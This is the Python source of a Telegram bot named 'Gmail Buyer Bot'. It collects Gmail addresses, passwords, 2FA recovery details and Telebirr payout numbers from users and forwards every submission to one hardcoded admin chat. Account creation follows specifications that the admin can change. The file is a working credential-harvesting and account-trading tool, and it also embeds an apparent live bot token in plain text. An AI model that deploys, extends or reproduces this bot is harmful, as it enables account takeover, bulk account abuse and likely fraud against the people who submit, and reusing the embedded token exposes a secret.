from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)

# Steps for the conversation flow
EMAIL, PASSWORD, TWO_FACTOR, TELEBIRR = range(4)

# Global variable to store your live specifications (defaults to a starter message)
CURRENT_SPECS = (
    "📌 **SPECIFICATIONS FOR NEW ACCOUNT:**\n\n"
    "Please create a new Gmail account using these details:\n"
    "• **First Name:** John\n"
    "• **Last Name:** Doe\n\n"
    "Once created, please reply with the **Gmail address** you made:"
)

# Admin Command to change specifications on the fly
async def set_specs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global CURRENT_SPECS
    user_id = update.effective_user.id
    
    # Ensure only you (Admin ID: 2103337926) can change the specifications
    if user_id != 2103337926:
        await update.message.reply_text("You are not authorized to use this command.")
        return

    # Extract whatever text came after /setspecs
    new_specs_text = " ".join(context.args)
    
    if not new_specs_text:
        await update.message.reply_text(
            "⚠️ Please provide the new specifications after the command.\n"
            "Example: `/setspecs First Name: Alex | Last Name: Johnson`",
            parse_mode="Markdown"
        )
        return

    # Update the global specs
    CURRENT_SPECS = f"📌 **SPECIFICATIONS FOR NEW ACCOUNT:**\n\n{new_specs_text}\n\nOnce created, please reply with the **Gmail address** you made:"
    
    await update.message.reply_text("✅ Successfully updated the account specifications for users!")

# Start Command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    reply_keyboard = [
        ["Create Account (My Specs)"],
        ["Submit Existing Account"],
        ["Balance", "Help"]
    ]
    markup = ReplyKeyboardMarkup(reply_keyboard, resize_keyboard=True)
    await update.message.reply_text(
        "Welcome to Gmail Buyer Bot! Choose an option below:",
        reply_markup=markup
    )

# Path A: User creates an account based on your live specifications
async def specs_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['submission_type'] = "Created via Your Specs"
    
    await update.message.reply_text(
        CURRENT_SPECS,
        parse_mode="Markdown",
        reply_markup=ReplyKeyboardRemove()
    )
    return EMAIL

# Path B: User submits their own pre-existing account
async def existing_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['submission_type'] = "Submitted Existing Account"
    
    await update.message.reply_text(
        "Please enter the **Gmail address** of your existing account:",
        parse_mode="Markdown",
        reply_markup=ReplyKeyboardRemove()
    )
    return EMAIL

# Step 2: Save Email, ask for Password
async def get_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['email'] = update.message.text
    await update.message.reply_text("Please enter the password for this Gmail account:")
    return PASSWORD

# Step 3: Save Password, ask for 2FA
async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['password'] = update.message.text
    await update.message.reply_text("Is 2FA enabled? Type 'No' or provide 2FA recovery details:")
    return TWO_FACTOR

# Step 4: Save 2FA, ask for Telebirr
async def get_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['2fa'] = update.message.text
    await update.message.reply_text(
        "Task submitted successfully!\nPlease enter your Telebirr account name/number for payout:"
    )
    return TELEBIRR

# Step 5: Save Telebirr, Send to Your Telegram, and Finish
async def get_telebirr(update: Update, context: ContextTypes.DEFAULT_TYPE):
    telebirr_info = update.message.text
    sub_type = context.user_data.get('submission_type', 'Standard')
    email = context.user_data.get('email')
    password = context.user_data.get('password')
    two_fa = context.user_data.get('2fa')
    
    user = update.effective_user
    user_id = user.id
    username = user.username if user.username else "No username"
    first_name = user.first_name
    
    my_admin_id = 2103337926  
    
    admin_message = (
        f"🚨 **NEW SUBMISSION ({sub_type})** 🚨\n\n"
        f"👤 **User Name:** {first_name}\n"
        f"🆔 **User ID:** `{user_id}`\n"
        f"🔗 **Username:** @{username}\n\n"
        f"📧 **Gmail:** {email}\n"
        f"🔑 **Password:** {password}\n"
        f"🛡️ **2FA:** {two_fa}\n"
        f"💰 **Telebirr:** {telebirr_info}"
    )
    
    await context.bot.send_message(chat_id=my_admin_id, text=admin_message, parse_mode="Markdown")

    context.user_data.clear()

    reply_keyboard = [
        ["Create Account (My Specs)"],
        ["Submit Existing Account"],
        ["Balance", "Help"]
    ]
    markup = ReplyKeyboardMarkup(reply_keyboard, resize_keyboard=True)
    
    await update.message.reply_text(
        "Submission received! Your account is pending verification and payout.",
        reply_markup=markup
    )
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Action canceled.")
    return ConversationHandler.END

if __name__ == '__main__':
    BOT_TOKEN = "8941199738:AAFs0IivEoEecPtmheF-bK5KZ3wqOGQreHo"
    
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[
            MessageHandler(filters.Regex("^Create Account \(My Specs\)$"), specs_start),
            MessageHandler(filters.Regex("^Submit Existing Account$"), existing_start)
        ],
        states={
            EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_email)],
            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
            TWO_FACTOR: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_2fa)],
            TELEBIRR: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_telebirr)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("setspecs", set_specs))  # Admin command to change instructions live
    app.add_handler(conv_handler)

    print("Bot is running...")
    app.run_polling()
